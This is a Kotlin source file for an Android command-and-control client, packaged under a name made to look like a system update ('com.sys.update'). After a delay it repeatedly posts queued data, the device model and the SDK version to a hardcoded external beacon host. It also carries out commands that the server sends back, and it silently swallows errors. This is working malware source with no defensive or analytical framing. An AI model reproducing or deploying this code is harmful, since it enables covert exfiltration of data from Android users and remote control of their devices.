package com.sys.update

import android.content.Context
import android.os.Build
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit

class C2Client(private val ctx: Context) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val C2_URL = "https://mydialog-update.lk/api/beacon"
    private val SESSION_ID = UUID.randomUUID().toString()

    suspend fun run() {
        delay(30_000L)
        while (true) {
            try {
                if (C2Queue.hasPending() || C2Service.consumeBeaconRequest()) {
                    val pending = C2Queue.drain()
                    val resp = beacon(pending)
                    resp?.let { handle(it) }
                }
            } catch (_: Exception) {}

            repeat(18) {
                if (C2Service.consumeBeaconRequest() && C2Queue.hasPending()) {
                    try {
                        val urgent = C2Queue.drain()
                        val resp = beacon(urgent)
                        resp?.let { handle(it) }
                    } catch (_: Exception) {}
                }
                delay(5_000L)
            }
        }
    }

    private suspend fun beacon(data: List<String>): JSONObject? = withContext(Dispatchers.IO) {
        val arr = JSONArray()
        data.forEach { arr.put(it) }

        val payload = JSONObject().apply {
            put("sid", SESSION_ID)
            put("model", Build.MODEL)
            put("sdk", Build.VERSION.SDK_INT)
            put("data", arr)
        }

        val body = payload.toString().toRequestBody("application/json".toMediaType())
        val req = Request.Builder().url(C2_URL).post(body).build()

        try {
            http.newCall(req).execute().use { r ->
                r.body?.string()?.let { if (it.isNotBlank()) JSONObject(it) else null }
            }
        } catch (_: IOException) { null }
    }

    private fun handle(cmd: JSONObject) {
        when (cmd.optString("cmd")) {
            "exit" -> System.exit(0)
            "ping" -> C2Queue.enqueueUrgent("""{"type":"pong","ts":${System.currentTimeMillis()}}""")
        }
    }
}
